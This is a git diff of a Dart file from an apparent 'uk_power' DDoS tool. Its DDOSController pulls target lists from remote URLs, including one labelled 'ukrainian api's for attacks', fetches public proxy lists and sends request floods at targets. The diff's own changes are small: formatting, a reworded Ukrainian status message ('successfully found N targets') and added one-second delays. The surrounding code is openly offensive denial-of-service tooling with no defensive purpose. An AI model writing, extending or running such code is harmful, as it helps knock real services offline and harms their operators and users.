@@ -2,6 +2,7 @@ import 'dart:async';
 import 'dart:convert';
 import 'dart:developer' as dev;
 import 'dart:io';
+
 import 'package:dio/dio.dart';
 import 'package:dio/adapter.dart';
 
@@ -11,15 +12,13 @@ import 'package:http/http.dart' as http;
 import 'package:uk_power/ddos_info.dart';
 
 /// our list of targets
-const String sourceURL =
-    "https://raw.githubusercontent.com/senpaiburado/zxcvbnty/main/ttqtet.txt";
+const String sourceURL = "https://raw.githubusercontent.com/senpaiburado/zxcvbnty/main/ttqtet.txt";
 
 /// ukrainian api's for attacks
 const String apiURL = "http://rockstarbloggers.ru/hosts.json";
 
 /// global list of proxies
-const String proxySource =
-    "https://proxylist.geonode.com/api/proxy-list?page=1&sort_by=lastChecked&sort_type=desc";
+const String proxySource = "https://proxylist.geonode.com/api/proxy-list?page=1&sort_by=lastChecked&sort_type=desc";
 
 /// default timeout for requests
 const timeout = Duration(seconds: 10);
@@ -133,7 +132,7 @@ class DDOSController {
       }
 
       return DDOSInfo(
-        msg: "Успішно знайдено ${directTargets.length} потенційних цілей",
+        msg: "Успішно знайдено ${directTargets.length} цілей",
         responseCode: response.statusCode,
         status: DDOSStatus.success,
         dateTime: DateTime.now(),
@@ -238,6 +237,7 @@ class DDOSController {
     void Function(DDOSInfo) callback,
     Map<String, String> headers,
   ) async {
+    await Future.delayed(const Duration(seconds: 1));
     for (String host in hosts) {
       try {
         // request target from host
@@ -315,6 +315,7 @@ class DDOSController {
     void Function(DDOSInfo) callback,
     Map<String, String> headers,
   ) async {
+    await Future.delayed(const Duration(seconds: 1));
     try {
       // need proxies
       List<Proxy> proxies = await _getProxies();
